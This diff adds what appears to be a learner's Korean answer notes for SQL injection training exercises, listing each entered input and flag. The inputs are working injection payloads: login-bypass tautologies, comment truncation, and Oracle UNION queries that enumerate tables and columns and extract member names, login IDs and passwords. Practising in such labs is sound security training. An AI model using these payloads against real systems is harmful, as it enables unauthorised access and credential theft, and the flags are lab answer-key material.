@@ -1,0 +1,27 @@
+JSP 문제 1번
+1. 입력한 값: z_answer@eqst2.com' or '1' = '1
+2. 정답: sql_injection_complete
+
+JSP 문제 2번
+1. 입력한 값: z_answer@eqst2.com'--
+2. 정답: exam_answer_complete
+
+PHP 문제 2번
+1. 입력한 값: 
+2. 정답: 
+
+JSP 문제 3번
+1. 입력한 값: z_answer@eqst3.com' or '1' = '1
+2. 정답:  eqst_anwerexam
+
+
+삼성동' union select 'a', 'b', 'c', 'd', 'e' from dual--
+
+삼성동' union select  table_name, 'a', 'a', 'a', 'a' from user_tables--
+
+삼성동' union select column_name, 'a', 'a', 'a', 'a' from user_tab_columns where table_name = 'SQL_UNION_ANSWER'--
+
+
+삼성동' union select user_nm, login_id, pass, pwdq, email from member--
+
+a' union select ANSWER_COLUMN,null,null,null,null from SQL_UNION_ANSWER --
